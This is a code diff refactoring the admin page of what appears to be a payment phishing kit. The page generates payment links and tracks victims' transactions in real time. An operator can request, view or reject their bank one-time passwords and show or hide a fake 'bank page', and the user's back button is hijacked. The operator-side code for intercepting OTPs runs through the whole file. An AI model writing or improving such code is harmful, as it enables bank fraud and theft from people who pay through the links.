@@ -6,110 +6,28 @@
   <title>Admin Panel</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
   <style>
-    body {
-      background: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      padding: 20px;
-    }
-    h1 {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-    .generate-link {
-      background: #222;
-      padding: 20px;
-      border-radius: 8px;
-      margin-bottom: 20px;
-    }
-    .form-group {
-      margin-bottom: 15px;
-    }
-    label {
-      display: block;
-      margin-bottom: 5px;
-      color: #aaa;
-    }
-    input, textarea {
-      width: 100%;
-      padding: 8px;
-      border: 1px solid #444;
-      background: #333;
-      color: #fff;
-      border-radius: 4px;
-    }
-    .payment-link {
-      margin-top: 15px;
-      padding: 10px;
-      background: #333;
-      border-radius: 4px;
-      display: none;
-    }
-    .copy-btn {
-      background: #22c55e;
-      border: none;
-      color: #fff;
-      padding: 5px 10px;
-      border-radius: 4px;
-      cursor: pointer;
-      margin-left: 10px;
-    }
-    table {
-      width: 100%;
-      border-collapse: collapse;
-      background: #111;
-      margin-bottom: 20px;
-    }
-    th, td {
-      padding: 10px;
-      border: 1px solid #333;
-      text-align: left;
-      font-size: 12px;
-    }
-    th {
-      background: #222;
-    }
-    tr:nth-child(even) {
-      background: #222;
-    }
-    button {
-      background: #4a90e2;
-      color: #fff;
-      border: none;
-      padding: 6px 10px;
-      margin-right: 4px;
-      cursor: pointer;
-      border-radius: 4px;
-      font-size: 12px;
-    }
-    button:hover {
-      background: #357ABD;
-    }
-    button:disabled {
-      background: #666;
-      cursor: not-allowed;
-    }
-    .status-badge {
-      padding: 2px 6px;
-      border-radius: 3px;
-      font-size: 11px;
-      font-weight: bold;
-    }
+    body { background: #000; color: #fff; font-family: Arial, sans-serif; padding: 20px; }
+    h1 { text-align: center; margin-bottom: 20px; }
+    .container { max-width: 1200px; margin: 0 auto; }
+    .generate-link { background: #222; padding: 20px; border-radius: 8px; margin-bottom: 20px; }
+    .form-group { margin-bottom: 15px; }
+    label { display: block; margin-bottom: 5px; color: #aaa; }
+    input, textarea { width: 100%; padding: 8px; border: 1px solid #444; background: #333; color: #fff; border-radius: 4px; }
+    .payment-link { margin-top: 15px; padding: 10px; background: #333; border-radius: 4px; display: none; }
+    .copy-btn { background: #22c55e; border: none; color: #fff; padding: 5px 10px; border-radius: 4px; cursor: pointer; margin-left: 10px; }
+    table { width: 100%; border-collapse: collapse; background: #111; margin-bottom: 20px; }
+    th, td { padding: 10px; border: 1px solid #333; text-align: left; font-size: 12px; }
+    th { background: #222; }
+    tr:nth-child(even) { background: #222; }
+    button { background: #4a90e2; color: #fff; border: none; padding: 6px 10px; margin-right: 4px; cursor: pointer; border-radius: 4px; font-size: 12px; }
+    button:hover { background: #357ABD; }
+    button:disabled { background: #666; cursor: not-allowed; }
+    .status-badge { padding: 2px 6px; border-radius: 3px; font-size: 11px; font-weight: bold; }
     .status-processing { background: #f59e0b; color: #000; }
     .status-otp { background: #3b82f6; color: #fff; }
     .status-success { background: #22c55e; color: #fff; }
     .status-fail { background: #ef4444; color: #fff; }
-    .otp-received {
-      background-color: #10B981;
-      color: #fff;
-      padding: 2px 6px;
-      border-radius: 4px;
-      font-size: 12px;
-    }
+    .otp-received { background-color: #10B981; color: #fff; padding: 2px 6px; border-radius: 4px; font-size: 12px; }
     .show-otp-btn { background: #22c55e; }
     .bank-page-btn { background: #8b5cf6; }
     .bank-page-btn:hover { background: #7c3aed; }
@@ -159,87 +77,56 @@
           <th>Actions</th>
         </tr>
       </thead>
-      <tbody>
-        <!-- Transaction rows will be injected here -->
-      </tbody>
+      <tbody></tbody>
     </table>
   </div>
-  
+
   <script src="/socket.io/socket.io.js"></script>
   <script>
-
     const socket = io();
-  
-  // Add this listener for new transactions
-  socket.on('new_transaction', () => {
-    loadTransactions();
-    console.log('Received new transaction notification');
-  });
-    let transactions = new Map();
-    let paymentLinks = new Map();
+    let transactionsMap = new Map();
 
-    // Generate Payment Link Handler – DO NOT remove any other parts of your code
-document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
+    // Payment Link Generation
+    document.getElementById('generateLinkForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const amountInput = document.getElementById('amount');
+      const descInput = document.getElementById('description');
+      const linkContainer = document.getElementById('paymentLinkContainer');
 
-  const amountInput = document.getElementById('amount');
-  const descInput = document.getElementById('description');
-  const linkContainer = document.getElementById('paymentLinkContainer');
+      try {
+        linkContainer.style.display = 'none';
+        const amount = parseFloat(amountInput.value);
+        const description = descInput.value.trim();
 
-  try {
-    linkContainer.style.display = 'none';
+        if (!amount || amount <= 0) throw new Error('Invalid amount');
+        if (!description) throw new Error('Description required');
 
-    const amount = parseFloat(amountInput.value);
-    const description = descInput.value.trim();
+        const response = await fetch('/api/generatePaymentLink', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ amount, description })
+        });
 
-    if (!amount || amount <= 0) {
-      alert('Please enter a valid positive amount');
-      return;
-    }
+        const data = await response.json();
+        if (!response.ok) throw new Error(data.message || 'Generation failed');
 
-    if (!description) {
-      alert('Description cannot be empty');
-      return;
-    }
-
-    const response = await fetch('/api/generatePaymentLink', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ amount, description })
+        document.getElementById('paymentLink').textContent = data.paymentLink;
+        linkContainer.style.display = 'block';
+      } catch (error) {
+        console.error('Error:', error);
+        alert(`Error: ${error.message}`);
+        linkContainer.style.display = 'none';
+      }
     });
 
-    if (!response.ok) {
-      const errorData = await response.json();
-      throw new Error(errorData.message || 'Payment link generation failed');
-    }
-
-    const data = await response.json();
-    document.getElementById('paymentLink').textContent = data.paymentLink;
-    linkContainer.style.display = 'block';
-    alert('Payment link generated successfully!');
-
-  } catch (error) {
-    console.error('Error:', error);
-    alert(`ERROR: ${error.message}`);
-    linkContainer.style.display = 'none';
-  }
-});
-  
-  function copyPaymentLink() {
-    const link = document.getElementById('paymentLink').textContent;
-    navigator.clipboard.writeText(link);
-    alert('Payment link copied to clipboard!');
-  }
-  
-  // ... (the rest of your admin.html script remains unchanged)
-
-    
+    // Transactions Handling
     async function loadTransactions() {
       try {
         const response = await fetch("/api/transactions");
         const data = await response.json();
         const tbody = document.querySelector("#transactionsTable tbody");
         tbody.innerHTML = '';
+        
         data.forEach(tx => {
           const row = document.createElement('tr');
           row.innerHTML = `
@@ -282,18 +169,19 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
                 </button>
               ` : ''}
               <button onclick="toggleBankpage('${tx.id}')" class="bank-page-btn">  
-    ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}  
-  </button>  
+                ${tx.bankpageVisible ? 'Hide Bankpage' : 'Show Bankpage'}  
+              </button>  
             </td>
           `;
           tbody.appendChild(row);
-          transactions.set(tx.id, tx);
+          transactionsMap.set(tx.id, tx);
         });
       } catch (error) {
         console.error('Error loading transactions:', error);
       }
     }
-    
+
+    // Transaction Actions
     async function updateStatus(id, status) {
       try {
         const response = await fetch("/api/updateRedirectStatus", {
@@ -305,10 +193,10 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         loadTransactions();
       } catch (error) {
         console.error('Error updating status:', error);
-        alert('Failed to update status. Please try again.');
+        alert('Failed to update status');
       }
     }
-    
+
     async function showOTP(id) {
       try {
         const response = await fetch("/api/showOTP", {
@@ -320,25 +208,10 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         loadTransactions();
       } catch (error) {
         console.error('Error showing OTP:', error);
-        alert('Failed to show OTP. Please try again.');
+        alert('Failed to show OTP');
       }
     }
-    
-    async function redirectToBankPage(id) {
-      try {
-        const response = await fetch("/api/redirectToBankPage", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ invoiceId: id })
-        });
-        if (!response.ok) throw new Error('Failed to redirect to bank page');
-        loadTransactions();
-      } catch (error) {
-        console.error('Error redirecting to bank page:', error);
-        alert('Failed to redirect to bank page. Please try again.');
-      }
-    }
-    
+
     async function markWrongOTP(id) {
       try {
         const response = await fetch("/api/wrongOTP", {
@@ -350,79 +223,57 @@ document.getElementById('generateLinkForm').addEventListener('submit', async (e)
         loadTransactions();
       } catch (error) {
         console.error('Error marking OTP as wrong:', error);
-        alert('Failed to mark OTP as wrong. Please try again.');
+        alert('Failed to mark OTP as wrong');
       }
     }
-    
-async function toggleBankpage(id) {
-  try {
-    const response = await fetch(`/api/transactions`);
-    const transactionsData = await response.json();
-    const txn = transactionsData.find(t => t.id === id);
-    if (!txn) throw new Error('Transaction not found');
 
-    const endpoint = txn.bankpageVisible ? '/api/hideBankpage' : '/api/showBankpage';
-    const apiResponse = await fetch(endpoint, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ invoiceId: id })
-    });
-
-    if (!apiResponse.ok) {
-      const errorData = await apiResponse.json();
-      throw new Error(errorData.message || 'Failed to toggle bank page');
+    async function toggleBankpage(id) {
+      try {
+        const response = await fetch("/api/showBankpage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to toggle bank page');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error toggling bank page:', error);
+        alert('Failed to toggle bank page');
+      }
     }
 
-    await loadTransactions();
-  } catch (error) {
-    console.error('Error:', error);
-    alert(`Error: ${error.message}`);
-  }
-}
+    async function hideBankPage(id) {
+      try {
+        const response = await fetch("/api/hideBankpage", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ invoiceId: id })
+        });
+        if (!response.ok) throw new Error('Failed to hide bank page');
+        loadTransactions();
+      } catch (error) {
+        console.error('Error hiding bank page:', error);
+        alert('Failed to hide bank page');
+      }
+    }
 
-// Hide Bankpage function
-async function hideBankPage(id) {
-  try {
-    const response = await fetch("/api/hideBankpage", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ invoiceId: id })
-    });
-
-    if (!response.ok) throw new Error('Failed to hide bank page');
-
-    // Emit event to user
-    socket.emit('hide_bankpage', { invoiceId: id });
-
-    loadTransactions();
-  } catch (error) {
-    console.error('Error hiding bank page:', error);
-    alert('Failed to hide bank page. Please try again.');
-  }
-}
-
-    app.post('/api/hideBankpage', (req, res) => {
-  const { invoiceId } = req.body;
-  const txn = transactions.get(invoiceId);
-  if (!txn) return res.status(404).json({ error: 'Transaction not found' });
-
-  txn.redirectStatus = null;
-  txn.bankpageVisible = false;
-
-  // Emit event to frontend to close the popup
-  io.emit('hide_bankpage', { invoiceId });
-
-  res.json({ status: 'success' });
-});
-
-    loadTransactions();
-    setInterval(loadTransactions, 2000);
-    
-    const socket = io();
-    socket.on('refreshTransactions', () => {
+    // Socket.io Updates
+    socket.on('new_transaction', () => {
       loadTransactions();
     });
-    
+
+    // Helper Functions
+    function copyPaymentLink() {
+      const link = document.getElementById('paymentLink').textContent;
+      navigator.clipboard.writeText(link);
+      alert('Link copied!');
+    }
+
+    // Initial Load
+    loadTransactions();
+    setInterval(loadTransactions, 2000);
+
+    // Back Button Prevention
     window.onpopstate = function(event) {
       if (confirm("Do you want to cancel this transaction?")) {
         window.location.href = '/fail.html?reason=canceled';
@@ -432,27 +283,5 @@ async function hideBankPage(id) {
     };
     history.pushState(null, null, window.location.href);
   </script>
-  </script>
-  <!-- Bankpage Overlay Element -->
-  <div id="bankpageOverlay" class="fullscreen-overlay">
-    <div class="spinner"></div>
-  </div>
-  
-  <!-- New CSS for the fullscreen overlay -->
-  <style>
-    .fullscreen-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      backdrop-filter: blur(5px);
-      z-index: 9999;
-      display: none;
-      justify-content: center;
-      align-items: center;
-    }
-  </style>
 </body>
 </html>
